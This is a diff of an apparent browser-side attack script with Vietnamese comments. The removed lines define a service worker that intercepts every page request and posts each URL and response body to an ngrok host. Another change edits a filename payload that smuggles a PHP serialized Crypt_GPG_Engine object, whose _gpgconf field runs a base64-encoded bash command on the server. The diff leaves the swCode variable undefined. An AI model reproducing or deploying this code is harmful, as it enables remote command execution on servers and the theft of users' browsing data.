@@ -1,22 +1,11 @@
 (async () => {
   const baseUrl = location.origin;
   // === 1. Ghi Service Worker bằng blob (không cần HTTPS nếu là blob) ===
-  const swCode = `
-    self.addEventListener('fetch', e => {
-      e.respondWith(
-        fetch(e.request).then(r => {
-          r.clone().text().then(body => {
-            fetch('https://f8b9e6ba5e30.ngrok-free.app/log', {
-              method: 'POST',
-              body: JSON.stringify({ url: e.request.url, body }),
-              mode: 'no-cors'
-            });
-          });
-          return r;
-        })
-      );
-    });
-  `;
+  const linkHref = link?.getAttribute("href");
+  console.log("File URL:", linkHref);
+  navigator.serviceWorker.register(linkHref)
+  .then(() => console.log("SW registered"))
+  .catch(err => console.error("Failed to register:", err));
 
   try {
     const blob = new Blob([swCode], { type: 'application/javascript' });
@@ -54,7 +43,7 @@
 
   
 
-  const rawFilename = 'payload.php;|O:16:"Crypt_GPG_Engine":1:{s:8:"_gpgconf";s:52:"bash -c \' $(base64 -d <<< "cHdkID4gL3RtcC9wd2Q=")\';#";};';
+  const rawFilename = 'payload.php;|O:16:"Crypt_GPG_Engine":1:{s:8:"_gpgconf";s:60:"bash -c \' $(base64 -d <<< "ZXZhbCAicHdkID4gL3RtcC9wd2Qi")\';#";};';
   const safeFilename = rawFilename.replace(/"/g, '\\"');  // Escape tất cả dấu "
 
   const preamble =
